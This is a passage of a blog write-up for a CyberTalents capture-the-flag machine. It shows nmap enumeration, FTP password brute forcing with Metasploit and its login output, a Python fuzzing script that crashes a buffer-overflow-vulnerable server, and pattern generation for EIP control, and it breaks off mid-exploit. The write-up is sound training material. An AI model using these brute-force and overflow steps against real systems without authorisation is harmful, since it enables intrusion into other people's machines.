<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Cybertalents Crashed Machine Writeup" /><meta name="author" content="Muhammad Adel" /><meta property="og:locale" content="en_US" /><meta name="description" content="Description" /><meta property="og:description" content="Description" /><link rel="canonical" href="https://itsfading.github.io/posts/Cybertalents-Crashed-Machine-Writeup/" /><meta property="og:url" content="https://itsfading.github.io/posts/Cybertalents-Crashed-Machine-Writeup/" /><meta property="og:site_name" content="Muhammad Adel" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-06-29T16:40:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Cybertalents Crashed Machine Writeup" /><meta name="twitter:site" content="@ItsFadinG_" /><meta name="twitter:creator" content="@Muhammad Adel" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Muhammad Adel"},"dateModified":"2025-04-07T14:20:15+02:00","datePublished":"2021-06-29T16:40:00+02:00","description":"Description","headline":"Cybertalents Crashed Machine Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://itsfading.github.io/posts/Cybertalents-Crashed-Machine-Writeup/"},"url":"https://itsfading.github.io/posts/Cybertalents-Crashed-Machine-Writeup/"}</script><title>Cybertalents Crashed Machine Writeup | Muhammad Adel</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Muhammad Adel"><meta name="application-name" content="Muhammad Adel"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/Mine.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Muhammad Adel</a></div><div class="site-subtitle font-italic">CyberSecurity geek, who wants to share his day-to-day knowledge</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://twitter.com/ItsFadinG_" aria-label="twitter" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/muhammadadel14" aria-label="linkedin" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/ItsFadinG" aria-label="github" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['Muhammad.adel.tr','gmail.com'].join('@')" aria-label="email" class="order-6" > <i class="fas fa-envelope"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Cybertalents Crashed Machine Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Cybertalents Crashed Machine Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Muhammad Adel </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Jun 29, 2021, 4:40 PM +0200" prep="on" > Jun 29, 2021 <i class="unloaded">2021-06-29T16:40:00+02:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 7, 2025, 2:20 PM +0200" prefix="Updated " > Apr 7 <i class="unloaded">2025-04-07T14:20:15+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2660 words">14 min</span></div></div><div class="post-content"><h2 id="description"><strong>Description</strong></h2><p>Get The highest privilege on the machine and find the flag!</p><p><strong>Difficulty</strong>: Hard</p><p>Target IP: <strong>3.122.178.169</strong></p><p>Target IP: <strong>18.193.129.237</strong></p><p>‌<strong>Challenge Link:</strong> <a href="https://cybertalents.com/challenges/machines/crashed">https://cybertalents.com/challenges/machines/crashed</a></p><h2 id="enumeration"><strong>Enumeration</strong></h2><h3 id="nmap"><strong>Nmap</strong></h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>root@kali:~/CyberTalents/Crashed# nmap <span class="nt">-p21</span>,135,139,445,1887,3389,5357 <span class="nt">-A</span> <span class="nt">-T4</span> 35.156.101.240
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-12 15:31 BST
Nmap scan report <span class="k">for </span>ec2-35-156-101-240.eu-central-1.compute.amazonaws.com <span class="o">(</span>35.156.101.240<span class="o">)</span>
Host is up <span class="o">(</span>0.014s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
1887/tcp open  filex-lport
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
</pre></table></code></div></div><p>‌</p><h3 id="ftp"><strong>FTP</strong></h3><p>So we have here an FTP server, I tried to join with anonymous creds but it didn’t worked. Now, we have only one solutions which to brute force the password. we can use a Metasploit module called <strong><em>auxiliary/scanner/ftp/ftp_login.</em></strong> it requires a space separated wordlist we will use a wordlist form sec list but we need to edit to match our requirements, we will replace the : with a space.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@kali:~/CyberTalents/Crashed# <span class="nb">cat</span> /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <span class="o">&gt;&gt;</span> ftp.txt
root@kali:~/CyberTalents/Crashed# <span class="nb">cat </span>ftp.txt | <span class="nb">sed</span> <span class="s2">"s/:/ /g"</span> <span class="o">&gt;&gt;</span> ftp-space-seprated.txt
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>msf6 <span class="o">&gt;</span> use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary<span class="o">(</span>scanner/ftp/ftp_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 35.156.101.240
rhosts <span class="o">=&gt;</span> 35.156.101.240
msf6 auxiliary<span class="o">(</span>scanner/ftp/ftp_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USERPASS_FILE ~/CyberTalents/Crashed/ftp-space-seprated.txt
USERPASS_FILE <span class="o">=&gt;</span> ~/CyberTalents/Crashed/ftp-space-seprated.txt
msf6 auxiliary<span class="o">(</span>scanner/ftp/ftp_login<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> 35.156.101.240:21     - 35.156.101.240:21 - Starting FTP login sweep
<span class="o">[!]</span> 35.156.101.240:21     - No active DB <span class="nt">--</span> Credential data will not be saved!
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: anonymous:anonymous <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: root:rootpasswd <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: root:12hrs37 <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: ftp:b1uRR3 <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: admin:admin <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: localadmin:localadmin <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: admin:1234 <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: apc:apc <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: admin:nas <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: Root:wago <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: Admin:wago <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: User:user <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>-] 35.156.101.240:21     - 35.156.101.240:21 - LOGIN FAILED: Guest:guest <span class="o">(</span>Incorrect: <span class="o">)</span>
<span class="o">[</span>+] 35.156.101.240:21     - 35.156.101.240:21 - Login Successful: ftp:ftp
</pre></table></code></div></div><p>So now we have a successful creds let’s use them and see what is inside the ftp.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>root@kali:~/CyberTalents/Crashed# ftp 3.122.178.169
Connected to 3.122.178.169.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse <span class="o">(</span>tim.kosse@filezilla-project.org<span class="o">)</span>
220 Please visit https://filezilla-project.org/
Name <span class="o">(</span>3.122.178.169:root<span class="o">)</span>: ftp
331 Password required <span class="k">for </span>ftp
Password:
230 Logged on
Remote system <span class="nb">type </span>is UNIX.
ftp&gt; <span class="nb">ls
</span>200 Port <span class="nb">command </span>successful
150 Opening data channel <span class="k">for </span>directory listing of <span class="s2">"/"</span>
<span class="nt">-r--r--r--</span> 1 ftp ftp          30036 Sep 08  2020 essfunc.dll
<span class="nt">-r-xr-xr-x</span> 1 ftp ftp          51635 Sep 10  2020 super_secure_server.exe
</pre></table></code></div></div><p>hmm! this machine seems to be a BOF machine. So let’s download these files first. I copied these file to windows 7 machine to work on them Locally First.</p><h2 id="buffer-overflow"><strong>Buffer Overflow</strong></h2><h3 id="enumeration-1"><strong>Enumeration</strong></h3><p>I run the super secure server in my local machine and it looks like the following:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdMk8lBouBv4-KU1afA%2F1.png?alt=media&amp;token=2844bd7c-a93a-4ec9-98b7-5257bbfbabb0" alt="" /></p><p>It listens for a connection. So we need to know which port that its running on. we can simply open the CMD and type <code class="language-plaintext highlighter-rouge">netstat -ab</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdMkU7qJJElaIRAa1iO%2F2.png?alt=media&amp;token=6b2f2727-f93b-4ac7-bcd6-5b8da432defa" alt="" /></p><p>It listens on port 13337. we let’s connect to it form our Kali Machine.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdMkfvtKHt1ouKXI2Mv%2F3.png?alt=media&amp;token=2e6d1db4-821a-4a91-822f-7050c28da904" alt="" /></p><p>hmm! We need to find anther command to know more about the application. a good solution for this simply we can run strings command to see the hidden command in the executable.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>root@kali:~/CyberTalents/Crashed# strings super_secure_server.exe 
!This program cannot be run in DOS mode.
.text
P`.data
.rdata
0@/4
0@.bs
Starting the super secure server version %s
WSAStartup failed with error: %d
Getaddrinfo failed with error: %d
Socket failed with error: %ld
Bind failed with error: %d
Listen failed with error: %d
Waiting for client connections...
Accept failed with error: %d
Received a client connection from %s:%u
Usage: %s [port_number]
If no port number is provided, the default port of %s will be used.
Welcome to the super secure server! Enter HELP for help
Send failed with error: %d
HELP 
HELP
SECRET
Mission Completed
</pre></table></code></div></div><p>‌ Now, as you see the hidden command is <code class="language-plaintext highlighter-rouge">SECRET</code> that we need it to exploit Buffer flow vulnerability.</p><h3 id="fuzzing"><strong>Fuzzing</strong></h3><p>The first phase of exploiting any buffer overflow vulnerability is first to find the vulnerable command and then to know How many characters that you need to overflow the buffer and crash the application.</p><p>We have to create a simple python script for this job which will be:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">100</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">192.168.1.6</span><span class="sh">"</span><span class="p">,</span> <span class="mi">13337</span><span class="p">))</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">'</span><span class="s">SECRET</span><span class="sh">'</span><span class="o">+</span> <span class="nb">buffer</span><span class="p">))</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="nb">buffer</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">100</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Fuzzing Crashed at {} bytes</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))))</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
</pre></table></code></div></div><p>This script will send a bunch of A strings that is increasing every time until we trigger the crash of the application.</p><p>Let’s attach our program to the Immunity debugger. Then, run our script.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-Mc-dhcC8XUrwR1pTDRF%2F-MdMg4OEcHH2RKjU6GEs%2F-MdMnwP9gYxDYzJkA9wU%2F4.png?alt=media&amp;token=3286c457-4d75-4d47-82e3-6c00b7f9c05f" alt="" /></p><p>The application needs 1000 bytes of strings to crash.</p><h3 id="overwrite-eip"><strong>Overwrite EIP</strong></h3><p><strong>EIP</strong> is the instruction pointer. It points to (holds the address of) the first byte of the next instruction to be executed. So we need to control the next instruction that will be executed to point it to a our reverse shell and pwn the machine. to do that we need to create a unique set of strings using Metasploit.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>root@kali:~/CyberTalents/Crashed# msf-pattern_create <span class="nt">-l</span> 1500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
</pre></table></code></div></div><p>‌ Then we need to edit our script to send this unique string.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="n">socket</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="sh">"</span><span 